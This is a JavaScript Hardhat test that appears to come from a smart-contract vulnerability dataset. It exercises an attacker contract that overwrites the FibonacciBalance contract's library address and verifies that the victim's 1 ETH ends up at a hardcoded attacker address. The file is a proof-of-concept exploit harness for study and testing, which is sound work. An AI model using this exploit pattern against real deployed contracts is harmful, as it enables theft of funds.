const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe('attack access_control/FibonacciBalance.sol', function () {
    let amount;
    async function deployContracts() {
      const [v] = await ethers.getSigners();
      const FibonacciLib = await ethers.getContractFactory('contracts/dataset/access_control/FibonacciBalance.sol:FibonacciLib');
      const lib = await FibonacciLib.deploy();  
      await lib.waitForDeployment();
      const address = await lib.getAddress();

      const FibonacciBalance = await ethers.getContractFactory('contracts/dataset/access_control/FibonacciBalance.sol:FibonacciBalance');
      amount = ethers.parseEther("1.0");
      const options = {
        from: v,
        value: amount};
      const victim = await FibonacciBalance.deploy(address, options);  
      await victim.waitForDeployment();

      const FibonacciBalanceAttacker = await ethers.getContractFactory('contracts/access_control/FibonacciBalance_attack.sol:FibonacciBalanceAttacker');
      const attacker = await FibonacciBalanceAttacker.deploy();  
      await attacker.waitForDeployment();
      return {lib, victim, attacker};
    }

    it('exploit access control vulnerability', async function () {
      const {lib, victim, attacker} = await loadFixture(deployContracts);
      const victim_addr = victim.target;

      const victimBalanceBefore = await ethers.provider.getBalance(victim_addr);
      expect(victimBalanceBefore).to.equal(amount);

      const attacker_address = '0x5C6AF7679A6fCd1eb3E12ea500463ec1D90780B3';
      const attackerBalanceBefore = await ethers.provider.getBalance(attacker_address);
      expect(attackerBalanceBefore).to.equal(0);

      let fibonacciLibrary = await victim.fibonacciLibrary();
      expect(fibonacciLibrary).to.equal(lib.target);
      
      // attacker changes the FibonacciLibrary address to its own contract address
      await attacker.attack(victim_addr);
      fibonacciLibrary = await victim.fibonacciLibrary();
      expect(fibonacciLibrary).to.equal(attacker.target);

      // victim withdraws the balance
      await victim.withdraw();

      const attackerBalanceAfter = await ethers.provider.getBalance(attacker_address);
      expect(attackerBalanceAfter).to.equal(amount);

      const victimBalanceAfter = await ethers.provider.getBalance(victim_addr);
      expect(victimBalanceAfter).to.equal(0);
    });
  });